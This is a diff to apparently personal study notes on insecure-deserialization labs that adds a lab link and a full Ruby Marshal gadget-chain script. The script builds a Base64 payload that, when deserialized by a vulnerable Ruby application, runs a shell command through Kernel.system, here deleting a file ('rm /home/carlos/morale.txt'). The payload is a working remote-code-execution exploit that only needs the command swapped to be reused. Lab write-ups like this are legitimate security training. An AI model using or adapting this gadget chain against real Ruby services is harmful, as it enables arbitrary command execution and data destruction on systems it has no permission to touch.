@@ -10,6 +10,7 @@
   - [4. Arbitrary object injection in PHP](./lab/4.%20Arbitrary%20object%20injection%20in%20PHP.md)
   - [5. Exploiting Java deserialization with Apache Commons](./lab/5.%20Exploiting%20Java%20deserialization%20with%20Apache%20Commons.md)
   - [6. Exploiting PHP deserialization with a pre-built gadget chain](./lab/6.%20Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain.md)
+  - [7. Exploiting Ruby deserialization using a documented gadget chain](./lab/7.%20Exploiting%20Ruby%20deserialization%20using%20a%20documented%20gadget%20chain.md)
 
 ## ysoserial
 
@@ -66,4 +67,53 @@ install:
 ```shell
 ┌──(kali㉿kali)-[~]
 └─$ sudo apt-get install phpggc  
+```
+
+## ruby
+
+```ruby
+# Autoload the required classes
+
+#edited
+require 'base64'
+
+Gem::SpecFetcher
+Gem::Installer
+
+# prevent the payload from running when we Marshal.dump it
+module Gem
+  class Requirement
+    def marshal_dump
+      [@requirements]
+    end
+  end
+end
+
+wa1 = Net::WriteAdapter.new(Kernel, :system)
+
+rs = Gem::RequestSet.allocate
+rs.instance_variable_set('@sets', wa1)
+#edited
+rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")
+
+wa2 = Net::WriteAdapter.new(rs, :resolve)
+
+i = Gem::Package::TarReader::Entry.allocate
+i.instance_variable_set('@read', 0)
+i.instance_variable_set('@header', "aaa")
+
+
+n = Net::BufferedIO.allocate
+n.instance_variable_set('@io', i)
+n.instance_variable_set('@debug_output', wa2)
+
+t = Gem::Package::TarReader.allocate
+t.instance_variable_set('@io', n)
+
+r = Gem::Requirement.allocate
+r.instance_variable_set('@requirements', t)
+
+payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+#edited
+puts Base64.encode64(payload)
 ```
